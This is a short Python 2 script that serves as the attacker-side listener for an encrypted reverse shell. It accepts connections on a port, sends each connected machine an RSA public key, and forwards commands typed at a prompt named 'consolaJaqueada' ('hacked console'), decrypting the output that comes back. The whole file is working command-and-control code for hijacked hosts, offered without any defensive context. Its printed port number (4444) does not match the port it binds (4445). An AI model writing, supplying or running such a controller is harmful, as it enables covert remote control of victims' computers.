#!/usr/bin/python

from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Hash import SHA256
import socket
from thread import *
import sys
import pickle


random_generator = Random.new().read
key = RSA.generate(2048, random_generator)
public_key = key.publickey()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(("0.0.0.0", 4445))
except socket.error, v:
    print "Binding failed. Error code : " + str(v[0]) + " Message " + v[1]
    sys.exit()


print "Socket bind complete"

s.listen(2)
print "[+] Listening to the incoming connection on port 4444..."

def clientthread_sendpublickey(client) :
    client.send(pickle.dumps(public_key))

def clienthandle(client) :
    while True :
        command = raw_input('consolaJaqueada~$ ')
        client.send(command)
        if command == 'quit' :
            break
        buf = client.recv(2048)
        encreply = pickle.loads(buf)
        print key.decrypt(encreply)

while True:
    (client, (ip, port)) = s.accept()
    print "Received connection from : ", ip
    start_new_thread(clientthread_sendpublickey, (client,))
    print "Public Key sent to", ip
    start_new_thread(clienthandle, (client,))
